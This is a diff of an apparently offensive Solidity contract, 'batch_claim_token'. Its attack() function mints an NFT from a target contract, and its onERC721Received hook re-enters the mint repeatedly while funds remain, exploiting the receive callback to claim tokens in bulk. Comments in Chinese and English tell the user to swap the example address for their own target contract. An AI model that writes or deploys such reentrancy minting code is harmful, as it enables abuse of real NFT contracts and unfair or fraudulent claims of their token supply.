@@ -17,11 +17,14 @@ contract batch_claim_token is IERC721Receiver  {
     address public se;
     uint256 public id;
 
-    //调用这个函数，参数就是领取数量
+
     function attack(address token) payable public{
             IAir(token).mintNFT{value: 0.4 ether}(1,'0x0000');
     }
-
+    
+    //0x6F99fa6D60D410b60E7362d21d4b36D0e66b9A8A 示例合约的地址, 改成自己的HB地址
+    //0x6F99fa6D60D410b60E7362d21d4b36D0e66b9A8A Example contract address, Change it.
+   
     function onERC721Received(address, address, uint256, bytes memory) external override  returns (bytes4) {
         if(address(this).balance >= 0.4 ether){
                 IAir(0x6F99fa6D60D410b60E7362d21d4b36D0e66b9A8A).mintNFT{value: 0.4 ether}(1,'0x0000');
